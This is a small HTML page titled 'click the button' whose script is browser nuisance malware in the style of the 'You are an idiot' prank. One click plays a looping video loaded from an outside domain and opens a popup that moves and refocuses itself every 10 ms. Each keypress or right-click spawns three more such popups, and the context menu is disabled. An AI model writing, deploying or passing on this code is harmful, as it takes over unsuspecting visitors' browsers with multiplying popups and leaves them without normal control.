<html>

<head>
  <title>click the button</title>
</head>

<body>

  <button id="c">click</button>
  <video src="https://mau-api.tk/cdn/idiot.mp4" loop id="vi" style="display: none; width:500px; height:300px;">
  <script>
    var a = document.getElementById("c")
    var b = document.getElementById("vi")
    a.addEventListener("click", function(){
    a.style.display="none"
      b.style.display="block"
      b.play()

function rd(min, max) {
    return Math.round(Math.random() * (max - min) + min)
}

     function ct(){
        let to 
        let x = 0
        let y = 0
        let speed = 12
        let wh = screen.height
        let ww = screen.width
        let ox = rd(1, ww)
        let oy = rd(1, wh)
function lerp (start, end, amt){
  return (1-amt)*start+amt*end;
}
let inc = 0
 let windo = window.open("about:blank", "", "_blank")
        windo.document.write(`  
        <video src="https://mau-api.tk/cdn/idiot.mp4" loop id="vi" autoplay style=" width:500px; height:300px;"> 
        <script>window.onload = () => vi.play()
        <\/script>
    `)
        windo.document.close()
      setInterval(function(){
        inc+=1
        if (inc>=9e9) inc=1
        windo.resizeTo(500, 300)
        windo.moveTo(lerp(ox, 700*Math.cos(inc/speed), .1),lerp(oy, 700*Math.sin(inc/speed), .1))
        windo.focus()
      }, 10)
     }
      
      ct()
      

      window.oncontextmenu = function() {
        for (let i = 0; i < 3; i++){
          ct()
        }
        return false;
      }
      
      window.onkeydown = function(){
        for (let i = 0; i < 3; i++){
          ct()
        }
      }
    })
    </script>

</body>

</html>
